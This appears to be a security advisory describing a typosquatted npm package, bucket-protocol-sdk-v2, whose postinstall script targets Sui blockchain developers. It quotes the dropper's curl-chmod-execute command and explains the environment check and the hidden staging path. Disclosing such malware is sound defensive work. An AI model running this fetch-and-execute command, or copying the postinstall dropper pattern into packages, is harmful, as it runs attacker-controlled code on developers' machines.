summary: Postinstall dropper targeting Sui blockchain developers
details: bucket-protocol-sdk-v2 is a typosquat of the legitimate bucket-protocol-sdk (Sui DeFi SDK), advertised in package.json as a 'community maintained drop-in replacement'. The package has no real implementation — src/bucket.ts is `export {};` and the author field is empty. Its only meaningful behavior is the postinstall hook (`"postinstall": "node install.js"`), which runs at npm install time. install.js detects Sui developer environments (presence of the `sui` CLI on PATH or `~/.sui/sui_config/client.yaml`) and, when found, executes `curl -s -L -o /tmp/.sui-helper <implantUrl> && chmod +x /tmp/.sui-helper && /tmp/.sui-helper &` — fetching an unverified binary from a remote host, staging it to a hidden path under /tmp, and executing it in the background. The implantUrl literal is currently empty with an author comment `// <--- PUT YOUR ACTUAL 0x0.st URL HERE`, indicating an unfinished/PoC build referencing the 0x0.st anonymous file host. The structural attack is fully wired (env-gate + curl + chmod + background exec + dot-file staging + targeted lure name) — only the URL string needs to be filled in for the dropper to deliver arbitrary attacker-controlled bytes to anyone who runs `npm install`.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
